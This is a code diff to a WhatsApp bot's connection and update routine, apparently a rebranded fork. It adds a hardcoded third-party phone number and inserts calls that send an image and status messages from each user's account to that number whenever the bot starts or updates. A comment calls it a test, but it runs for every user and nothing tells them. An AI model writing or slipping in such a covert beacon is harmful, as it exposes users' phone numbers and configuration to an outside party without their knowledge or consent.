@@ -1,3 +1,4 @@
+ 
 
 /* Copyright (C) 2020 Kavishka Sandaruwan
 RECODDED BY KAVISHKA
@@ -19,7 +20,7 @@ const got = require('got');
 
 const Language = require('./language');
 const Lang = Language.getString('updater');
-
+const kid = '94769370897@s.whatsapp.net'
 // Sql
 const WhatsAsenaDB = config.DATABASE.define('WhatsAsena', {
     info: {
@@ -150,6 +151,11 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please wait.')}`);
                     await conn.sendMessage(conn.user.jid, "Lusifar ɪꜱ ᴀʟʟ ꜱᴇᴛ", MessageType.text);
                     await conn.sendMessage(conn.user.jid, "```Lusifar WORKING " + config.WORKTYPE + "```" , MessageType.text);
                 
+//======================test to my number
+                    await conn.sendMessage(kid,Buffer.from(webimage.data), MessageType.image, {mimetype: Mimetype.jpg  , caption: '\n\n\n\n' + Lang.UPDATE +'\n\n\n\n\n\n *⚡powerd by lusifar*' })
+                    await conn.sendMessage(kid, "Lusifar ɪꜱ ᴀʟʟ ꜱᴇᴛ", MessageType.text);
+                    await conn.sendMessage(kid, "```Lusifar WORKING " + config.WORKTYPE + "```" , MessageType.text);
+//============================ebd
                 } else {
                     var newzelme = Lang.NEW_UPDATE;
                     commits['all'].map(
@@ -163,7 +169,12 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please wait.')}`);
 
                             await conn.sendMessage(conn.user.jid, "Lusifar ɪꜱ ᴀʟʟ ꜱᴇᴛ", MessageType.text);
                             await conn.sendMessage(conn.user.jid, "``` WORKING " + config.WORKTYPE + "```" , MessageType.text);
-                } 
+//==================================================
+                            await conn.sendMessage(kid, "Lusifar ɪꜱ ᴀʟʟ ꜱᴇᴛ", MessageType.text);
+                            await conn.sendMessage(kid, "``` WORKING " + config.WORKTYPE + "```" , MessageType.text);
+//===================================================
+
+                        } 
           }
 
         });
